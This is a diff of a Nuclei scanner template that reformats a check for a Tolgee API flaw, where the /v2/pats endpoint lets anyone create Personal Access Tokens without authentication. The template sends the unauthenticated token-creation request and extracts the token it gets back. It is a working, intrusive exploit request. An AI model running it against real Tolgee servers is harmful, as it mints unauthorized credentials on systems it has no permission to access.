@@ -1,52 +1,53 @@
-http:
-- extractors:
-  - part: body
-    regex:
-    - '"token"\s*:\s*"([^"]+)"'
-    type: regex
-  matchers:
-  - condition: and
-    part: body
-    type: word
-    words:
-    - '{"token":'
-    - '"createdAt"'
-  - part: content_type
-    type: word
-    words:
-    - application/hal+json
-  - status:
-    - 201
-    type: status
-  matchers-condition: and
-  raw:
-  - 'POST /v2/pats HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Accept-Encoding: gzip
-
-
-    {"description":"{{string}}"}
-
-    '
 id: tolgee-api-anonymous
-info:
-  author: matejsmycka
-  description: 'The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication,
-    allowing attackers to create Personal Access Tokens (PATs). These tokens can then
-    be leveraged to interact with the API and gain elevated privileges.
 
-    '
-  metadata:
-    max-request: 1
-    runzero-review: REJECT/2025-11-17/excluding tag intrusive
-    shodan-query: html:"tolgee"
-    verified: true
+info:
   name: Tolgee API - Misconfiguration Anonymous Access
-  reference:
-  - https://docs.tolgee.io/api
+  author: matejsmycka
   severity: medium
+  description: |
+    The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication, allowing attackers to create Personal Access Tokens (PATs). These tokens can then be leveraged to interact with the API and gain elevated privileges.
+  reference:
+    - https://docs.tolgee.io/api
+  metadata:
+    runzero-review: REJECT/2025-11-17/excluding tag intrusive
+    max-request: 1
+    verified: true
+    shodan-query: html:"tolgee"
   tags: api,tolgee,misconfig,intrusive,vuln
+
 variables:
-  string: '{{to_lower(''{{randstr}}'')}}'
+  string: "{{to_lower('{{randstr}}')}}"
+
+http:
+  - raw:
+      - |
+        POST /v2/pats HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+
+        {"description":"{{string}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"token":'
+          - '"createdAt"'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - application/hal+json
+
+      - type: status
+        status:
+          - 201
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
